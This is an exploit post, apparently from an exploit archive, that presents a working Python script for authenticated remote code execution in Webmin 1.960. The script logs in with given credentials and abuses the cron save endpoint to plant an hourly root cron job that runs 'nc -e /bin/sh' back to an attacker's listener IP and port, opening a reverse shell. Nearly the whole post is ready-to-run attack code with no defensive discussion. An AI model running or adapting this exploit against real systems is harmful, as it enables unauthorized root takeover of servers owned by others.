---
layout: post
title: Webmin 1.960 - Remote Code Execution (Authenticated)
date: 2020-10-22 21:00:00 +0000
author: Ahmet Ümit BAYRAM
category: exploit
tags: rce,exploit,command,execution,code,webmin

---
\# Exploit Title: Webmin 1.960 - Remote Code Execution (Authenticated)  
\# Date: 2020-10-23  
\# Exploit Author: Ahmet Ümit BAYRAM  
\# Vendor: [https://www.webmin.com](https://www.webmin.com "https://www.webmin.com")  
\# Software Link: [https://netix.dl.sourceforge.net/project/webadmin/webmin/1.960/webmin_1.960_all.deb](https://www.webmin.com "https://www.webmin.com")  
\# Version: 1.960  
\# Tested on: Kali Linux & Ubuntu 18.04.5  
\# CVE: N/A  
  
  
\------- Exploit -------

    #!/usr/bin/python3
    
    import requests
    import sys
    import warnings
    from bs4 import BeautifulSoup
    import json
    from urllib3.exceptions import InsecureRequestWarning
    
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) #added
    warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
    
    if len(sys.argv) < 6:
        print("Usage: ./exploit.py http(s)://url username password listenerIP listenerPort")
        exit()
    
    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    ip = sys.argv[4]
    port = sys.argv[5]
    custom_header = {"Referer": url + "/cron/edit_cron.cgi?new=1&search=&xnavigation=1",
    		 "X-Progressive-URL": url + "/cron/save_cron.cgi",
    		 "X-Requested-From-Tab": "webmin",
    		 "X-Requested-From":"cron",
    		 "X-Requested-With":"XMLHttpRequest"}
    
    req = requests.session()
    login_creds = {
        "user":username,
        "pass":password,
    	}
          
    get_cookie = req.get(url,verify=False)
    cookies = get_cookie.cookies
    
    print("[+] Sendin login request...")
    login = req.post(url + "/session_login.cgi", login_creds, verify = False,cookies = cookies)
    
    
    if "Warning!" not in login.text:
    
    
        payload = "/cron/save_cron.cgi?new=1&idx=&search=&user=root&active=1&cmd=nc%20-e%20%2Fbin%2Fsh%20" + ip + "%20" + port + "&input=&comment=&special=hourly&special_def=0&all_mins=1&all_hours=1&all_days=1&all_months=1&all_weekdays=1&range_def=1&range_start_day=&range_start_month=1&range_start_year=&range_end_day=&range_end_month=1&range_end_year=&undefined="
        page = url + payload
        req2 = req.get(page,verify = False,cookies=login.cookies,headers=custom_header)
        print("[+] Sending payload...")
        print("[+] Check your listener !...")
    
    else:
        print("[-] Wrong credentials or may the system patched.")
        exit()